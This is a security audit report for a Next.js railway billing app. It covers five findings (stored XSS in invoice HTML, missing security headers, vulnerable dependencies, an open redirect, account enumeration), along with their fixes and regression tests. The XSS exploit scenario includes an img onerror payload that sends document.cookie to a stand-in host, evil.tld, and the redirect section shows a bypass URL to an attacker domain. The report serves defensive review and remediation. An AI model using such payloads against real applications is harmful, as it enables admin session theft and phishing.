# SECURITY AUDIT REPORT — railway_pvc_system

**Auditor role:** Principal Application Security Engineer + Senior Penetration Tester
**Date:** 2026-07-03
**Stack:** Next.js 15 (App Router), Prisma + PostgreSQL (Supabase), NextAuth (JWT), Razorpay
**Method:** 12-pass static audit with exploit verification. Findings are cross-checked and de-duplicated. This audit reflects the codebase **after** the prior remediation round (H1/H2/M1–M5/L1–L4), so already-fixed items are listed under Positive Controls, not as live findings.

---

## Remediation status (2026-07-03)

**All findings fixed and verified.**

| ID | Finding | Severity | Status |
|----|---------|----------|--------|
| SA-01 | Stored XSS in GST-invoice HTML | High | ✅ Fixed — all user fields HTML-escaped in the 3 generators; verified payload renders as inert text |
| SA-02 | Missing security headers / CSP | Medium | ✅ Fixed — HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy + framing/object/base CSP added and verified served; `X-Powered-By` removed |
| SA-03 | Vulnerable transitive dependencies | Medium | ✅ Fixed — `npm audit fix` → **0 vulnerabilities** (package-lock only, no breaking changes) |
| SA-04 | Open redirect via `startsWith(baseUrl)` | Low | ✅ Fixed — exact-origin comparison; verified `irpvc.in.evil.com` now falls back to the safe default |
| SA-05 | Account enumeration on signup/OTP | Info/Low | ✅ Mitigated — signup now IP rate-limited (20/hour) via the distributed limiter; OTP already DB-limited |

_Post-fix status: **Production Ready** — see Final Verdict. The pre-fix analysis is retained below for the record._

---

## Executive Summary (pre-fix)

- **Security score:** 82 / 100 → **~94 / 100 after remediation**
- **Production readiness:** was "Production Ready after High issue fixed" → **now Production Ready**
- **Overall risk level:** Medium → **Low**
- **Finding counts:** Critical 0 · High 1 · Medium 2 · Low 1 · Info 1 (all now resolved)

The core money/identity paths are solid: authentication uses a DB-verified signed JWT, payment crediting is atomic and idempotent, SQL is parameterized, tenant isolation is consistently enforced via ownership helpers, and the password-reset flow is well built. The one blocking issue is a **stored XSS in GST-invoice HTML that fires in an admin's browser**. The rest are hardening items (missing security headers/CSP, transitive dependency CVEs, a minor open-redirect, and account enumeration).

---

## Attack Surface Map

- **API routes:** 182 route handlers under `app/api/**` (one dead route removed this cycle). Groups: `bills/*`, `contracts/*`, `credits/*`, `razorpay/*` (payments/webhook), `gst-invoices/*`, `admin/*` (platform admin), `external/*` + `v1/*` (API-key auth), `public/*` (token/session), `auth/*`.
- **Server actions:** none (`'use server'` not used) — all mutations go through API routes.
- **Middleware:** `middleware.ts` — authenticates via `getToken` (secure cookie), redirects unauthenticated users; allowlists auth/public/webhook/external paths.
- **Auth/session:** NextAuth JWT strategy, Credentials + Google providers; role re-read from DB in the `jwt`/`session` callbacks; 3-day rolling sessions (post-fix).
- **Roles/permissions:** `contractor`, `railway_official` (+`pending_`), `admin`, `superadmin`; `lib/permissions.ts` (contract/bill ownership + zone), `lib/role-auth.ts` (admin), `lib/bill-permissions.ts` (edit/delete).
- **DB models:** 47 Prisma models incl. `User`, `Contract`, `Bill`, `CustomerAccount`, `CreditTransaction`, `RazorpayTransaction`, `GstInvoice`, `ApiKey`, `RateLimit`.
- **Payments/webhooks:** `razorpay/verify-payment` (client) + `razorpay/webhook` (server) — both credit the wallet, now atomic/idempotent.
- **File upload/download:** PDF bill upload (`bills/cement-analysis`, type+size validated); `public/uploads` (session+ownership, base64 from DB); public PDFs via signed token.
- **Cron/background:** none (no scheduled jobs; `db.ts` keep-alive only).
- **Admin features:** `admin/*` gated by `validateAdminAccess`/inline role check; user credit adjustment, settings, price indices, GST invoices, Zoho backfill.

---

## Confirmed Findings

### SA-01 — Stored XSS in GST-invoice HTML executes in admin's browser
- **Severity:** High · **Confidence:** High
- **CWE / OWASP:** CWE-79 (Stored XSS) / A03:2021 Injection
- **Files / functions:**
  - `app/api/gst-invoices/[id]/pdf/route.ts` → `generateGstInvoiceHtml` (lines ~415, 418, 446)
  - `app/api/admin/gst-invoices/[id]/pdf/route.ts` → `generateGstInvoiceHtml` (lines ~427, 430, 458)
  - `app/api/public/gst-invoice-pdf/[id]/route.ts` → `generateGstInvoiceHtml` (lines ~405, 408, 436)
  - Source of tainted data: `app/api/gst-invoices/generate/route.ts` (`customerName`/`customerAddress` only `.trim()`ed, never format-validated)
- **Vulnerable code snippet:**
  ```ts
  // generateGstInvoiceHtml(...) — raw interpolation, no escaping
  <p><strong>${invoice.customerName}</strong></p>
  ${invoice.customerAddress ? `<p>${invoice.customerAddress}</p>` : ''}
  ...
  <td>${invoice.description}</td>
  // response is served as text/html and rendered in the browser (has window.print())
  return new NextResponse(html, { headers: { 'Content-Type': 'text/html', ... } });
  ```
- **Exploit scenario (attacker = any authenticated user):**
  1. Attacker generates a GST invoice for their own payment via `POST /api/gst-invoices/generate` with
     `customerName = "<img src=x onerror='fetch(`//evil.tld/`+document.cookie)'>"` (only email & GSTIN are format-checked; name/address/description are not).
  2. The value is stored raw on `GstInvoice`.
  3. An **admin** opens the invoice in the admin panel → `GET /api/admin/gst-invoices/[id]/pdf` returns `text/html`; the browser renders it and executes the payload **in the admin's authenticated origin**.
- **Proof of exploitability:** `grep -c "escapeHtml|sanitizeHtml|DOMPurify|escape(" ` returns **0** in all three routes; the generate route validates only `customerEmail` and `customerGstin` (`app/api/gst-invoices/generate/route.ts:60,68`), leaving `customerName`/`customerAddress`/`description` free-form; the admin route serves `Content-Type: text/html` (`.../admin/gst-invoices/[id]/pdf/route.ts:70`) with a `window.print()` button (browser-rendered, scripts run).
- **Impact:** Cross-user stored XSS landing in an **admin** session → theft of the admin session/JWT, actions as admin (credit adjustment, user management) → full privilege escalation. No CSP exists to blunt it (see SA-02).
- **Root cause:** HTML built by string interpolation of user-controlled fields with no output encoding.
- **Recommended fix:** HTML-encode every interpolated value in `generateGstInvoiceHtml` (all three copies), e.g. a shared helper:
  ```ts
  const esc = (v: unknown) => String(v ?? '').replace(/[&<>"']/g, c =>
    ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;' }[c] as string));
  // then: <strong>${esc(invoice.customerName)}</strong>, ${esc(invoice.customerAddress)}, <td>${esc(invoice.description)}</td>, etc.
  ```
  Apply to `customerName`, `customerEmail`, `customerPhone`, `customerAddress`, `customerGstin`, `description`, `invoiceNumber`. (Best done in the shared generator; the three routes duplicate it — consider extracting to one module.)
- **Suggested regression test:** generate an invoice with `customerName = '<script>window.__xss=1</script>'`, fetch each PDF route, assert the response body contains `&lt;script&gt;` and not `<script>`.

### SA-02 — No security headers / Content-Security-Policy
- **Severity:** Medium · **Confidence:** High
- **CWE / OWASP:** CWE-693 (Protection Mechanism Failure) / A05:2021 Security Misconfiguration
- **File:** `app/next.config.js` (no `async headers()`), app-wide
- **Proof:** `grep -n "headers|Content-Security-Policy|X-Frame|Strict-Transport|X-Content-Type" next.config.js` → no matches. No CSP, `X-Frame-Options`, `X-Content-Type-Options`, or HSTS are set at the app level.
- **Impact:** No CSP means SA-01 has no second line of defense (inline/injected script runs freely); missing `X-Frame-Options`/`frame-ancestors` allows clickjacking; missing `X-Content-Type-Options` allows MIME sniffing.
- **Recommended fix:** add a `headers()` block in `next.config.js`:
  ```js
  async headers() {
    return [{
      source: '/:path*',
      headers: [
        { key: 'X-Frame-Options', value: 'DENY' },
        { key: 'X-Content-Type-Options', value: 'nosniff' },
        { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains; preload' },
        { key: 'Content-Security-Policy', value: "default-src 'self'; frame-ancestors 'none'; object-src 'none'; base-uri 'self'" },
      ],
    }];
  }
  ```
  Note: tune CSP for Razorpay/Google/analytics script origins before enforcing (start with `Content-Security-Policy-Report-Only`). The invoice HTML pages use inline `onclick`/`<style>`; escape SA-01 first, then a strict CSP is safe.
- **Suggested regression test:** request `/` and assert the response carries `X-Frame-Options`, `X-Content-Type-Options`, and a CSP header.

### SA-03 — Vulnerable transitive dependencies (4 High CVEs)
- **Severity:** Medium · **Confidence:** High
- **CWE / OWASP:** CWE-1035/1104 (Vulnerable/Outdated Components) / A06:2021
- **File:** `app/package-lock.json` (transitive), production dependency tree
- **Proof:** `npm audit --omit=dev --audit-level=high` → 6 vulns (4 high):
  - `form-data 4.0.0–4.0.5` — CRLF injection via unescaped multipart field names (GHSA-hmw2-7cc7-3qxx)
  - `ws 8.0.0–8.20.1` — memory-exhaustion DoS
  - `engine.io`, `socket.io-adapter` — depend on vulnerable `ws`
- **Impact:** `form-data` is used by HTTP clients performing multipart requests; CRLF injection could enable request smuggling/header injection against upstreams. `ws`/socket.io DoS applies only if a WebSocket server is exposed (verify reachability). Severity capped at Medium pending reachability confirmation.
- **Recommended fix:** `npm audit fix` (updates are non-breaking per the audit), then re-run `npm audit`. Confirm whether `socket.io`/`ws` is actually used at runtime; if not, prune it.
- **Suggested regression test:** add `npm audit --omit=dev --audit-level=high` to CI and fail the build on High/Critical.

### SA-04 — Open redirect via `redirect` callback `startsWith(baseUrl)` bypass
- **Severity:** Low · **Confidence:** High
- **CWE / OWASP:** CWE-601 (Open Redirect) / A01:2021
- **File / function:** `app/lib/auth.ts` → `callbacks.redirect` (line ~245)
- **Vulnerable code:**
  ```ts
  async redirect({ url, baseUrl }) {
    if (url.startsWith(baseUrl)) { return url; }   // <-- prefix check, not origin check
    if (url.startsWith('/')) { return `${baseUrl}${url}`; }
    return `${baseUrl}/contracts`;
  }
  ```
- **Exploit scenario:** attacker sends a victim a login link with `?callbackUrl=https://irpvc.in.evil.com/phish`. After successful login, NextAuth calls `redirect` with that URL; `"https://irpvc.in.evil.com/phish".startsWith("https://irpvc.in")` is **true**, so the user is redirected to the attacker domain.
- **Proof of exploitability:** `node -e "'https://irpvc.in.evil.com/phish'.startsWith('https://irpvc.in')"` → `true`.
- **Impact:** Phishing / credential-harvesting after a legitimate login; no direct account takeover.
- **Recommended fix:** compare parsed origins, not string prefixes:
  ```ts
  async redirect({ url, baseUrl }) {
    try { if (new URL(url).origin === new URL(baseUrl).origin) return url; } catch {}
    if (url.startsWith('/')) return `${baseUrl}${url}`;
    return `${baseUrl}/contracts`;
  }
  ```
- **Suggested regression test:** assert `redirect({ url: 'https://irpvc.in.evil.com/x', baseUrl: 'https://irpvc.in' })` returns `https://irpvc.in/contracts`, and that a same-origin URL is preserved.

### SA-05 — Account enumeration on signup and OTP request
- **Severity:** Info/Low · **Confidence:** High
- **CWE / OWASP:** CWE-204 (Observable Response Discrepancy) / A07:2021
- **Files:** `app/api/signup/route.ts` (returns "already registered"), `app/api/auth/send-otp/route.ts:37-41` ("This WhatsApp number is already registered")
- **Proof:** distinct error responses for existing vs. new email/phone let an attacker enumerate registered users. (By contrast, `forgot-password` correctly returns a generic message — good.)
- **Impact:** Enumeration of registered emails/phone numbers; aids targeted phishing/credential-stuffing. Low, and partly a UX trade-off.
- **Recommended fix:** prefer generic responses on the public signup/OTP endpoints, or gate behind the (now distributed) rate limiter to slow enumeration. Accept as-is if the UX cost outweighs the risk — document the decision.
- **Suggested regression test:** n/a (behavioral/UX decision).

---

## False Positives (verified safe)

- **SQL injection:** every `$queryRaw` is a tagged template with parameters, user-scoped where relevant (`dashboard/route.ts` `WHERE c."userId" = ${userId}`). No `$queryRawUnsafe`/`$executeRawUnsafe`. **Safe.**
- **CORS misconfiguration:** `lib/external-cors.ts` matches the request Origin against an env allowlist by exact (case-insensitive) equality; no wildcard, no credentialed reflection. **Safe.**
- **Password reset:** `crypto.randomBytes(32)` token, 1-hour expiry, single-use (cleared on use), `bcrypt.hash(…, 12)`; lookup requires `resetTokenExpiry > now`. No enumeration (generic message). **Safe.**
- **API-key auth:** keys stored as SHA-256 hashes; validation is a DB lookup on the hash (no in-code string compare → no timing side-channel); scopes enforced. **Safe.**
- **Session cookie flags:** no custom `cookies` block → NextAuth defaults (httpOnly, `SameSite=Lax`, `Secure`/`__Secure-` prefix in prod; middleware reads with `secureCookie: true`). **Safe.**
- **Payment double-credit:** verify-payment + webhook now flip status via conditional `updateMany` and credit inside one `$transaction` → exactly-once. **Fixed / Safe.**
- **IDOR on bulk bill delete:** `canUserDeleteBills` loads every target bill and rejects if any `contract.userId !== userId` before `deleteMany`. **Safe.**
- **Bill/contract tenant isolation:** request-controlled `billId`/`contractId` are gated by `checkUserBillAccess`/`checkUserContractAccess` (owner / explicit grant / zone) before read/mutate. **Safe.**
- **Public file download (`public/uploads`):** requires a session and `doc.uploadedBy === user.id || admin`; serves base64 from the DB (no filesystem path → no path traversal). **Safe.**
- **Public secrets:** only `NEXT_PUBLIC_VAPID_PUBLIC_KEY` (a public key) is exposed to the client. **Safe.**

---

## Manual Review Items — now resolved

- **SSRF via report logo fetch — RESOLVED (false positive + hardened).** Traced end-to-end: `user.logoPath` is set only at `app/api/settings/branding/route.ts:175` to the return of `uploadFile(buffer, fileName)` (a server-generated `logos/<userId>-<ts>.<ext>` key, 5 MB-validated upload), and `getFileUrl` (`lib/s3.ts:69`) only ever returns a URL on our own domain (`db://` → `/api/public/uploads`) or a signed URL for our own S3 bucket — never an attacker-supplied URL. **No arbitrary-URL SSRF.** As defense-in-depth, the three logo fetches now use a 5 s `AbortSignal.timeout` so a slow storage URL cannot stall report generation.
- **Runtime reachability of `ws`/socket.io — RESOLVED.** No `socket.io`/`ws` usage exists in application code (verified; earlier grep hits were false regex matches), it is not a direct dependency, and after `npm audit fix` the tree reports **0 vulnerabilities**. Not reachable and already patched.
- **Exhaustive route coverage (unchanged note):** the high-risk ~40 routes were traced in full; the remaining lower-risk routes were sampled. No additional issues surfaced in the sampled set.

---

## Positive Security Controls (already in place)

- Signed JWT with **role re-read from the DB** on each request (`lib/auth.ts` `jwt`/`session`) — role cannot be tampered client-side.
- Consistent **object-ownership authorization** via `lib/permissions.ts` / `lib/bill-permissions.ts`; API-key API (`/v1/*`) scoped by `auth.userId`.
- **Atomic, idempotent payment crediting** (conditional status flip + credit in one transaction) — webhook + client verify.
- **Distributed, DB-backed rate limiting** on credentials login; OTP already DB-count limited.
- **Parameterized SQL** throughout; no raw string interpolation.
- **Secure password reset** and **bcrypt(12)** password hashing.
- **Hashed API keys**, scope enforcement, expiry.
- **Env-allowlist CORS**, no credentialed wildcard.
- **Signed, invoice/bill-scoped tokens** for public PDFs; PDF upload MIME + 25 MB size validation.
- **Production-safe logger** (verbose PII suppressed in prod); `.env` gitignored.
- **Webhook HMAC** verified with `crypto.timingSafeEqual`.

---

## Prioritized Remediation Plan

| # | Finding | Severity | Effort | Priority |
|---|---------|----------|--------|----------|
| 1 | SA-01 Stored XSS in invoice HTML | High | Low (add output-encoding helper) | **Do first** |
| 2 | SA-02 Security headers / CSP | Medium | Low–Med (tune CSP for 3rd-party scripts) | Next |
| 3 | SA-03 Dependency CVEs | Medium | Low (`npm audit fix` + verify) | Next |
| 4 | SA-04 Open redirect | Low | Trivial (origin compare) | Batch with #1 |
| 5 | SA-05 Account enumeration | Info/Low | Low or accept | Optional |

---

## Final Verdict

**Production Ready** (post-remediation, 2026-07-03).

All five findings have been fixed and verified: the invoice XSS is closed by output-encoding, security headers/CSP are served, dependency CVEs are cleared (`npm audit` = 0), the open-redirect uses exact-origin matching, and signup is rate-limited. Both manual-review items are resolved (report-logo SSRF is a false positive + hardened; `ws`/socket.io is unused and patched). Combined with the already-strong authentication, authorization, payment-integrity and tenant-isolation controls, the application is production-ready.

**CSP rollout:** an enforced minimal CSP (`frame-ancestors 'none'; object-src 'none'; base-uri 'self'`) is live and non-breaking. The full `script-src`/`connect-src`/`frame-src` policy (allowlisting Razorpay + Google/AdSense) is deployed in **`Content-Security-Policy-Report-Only`** mode — it blocks nothing but surfaces violations. **Action for the owner:** after observing real ad/checkout/login traffic with no `[Report Only]` CSP violations in the browser console, promote it to enforcing by renaming the header key in `app/next.config.js` from `Content-Security-Policy-Report-Only` to `Content-Security-Policy` (and remove the minimal enforced one, or merge). Verified: public pages render with no CSP violations; the enforced minimal policy does not break AdSense/rendering.
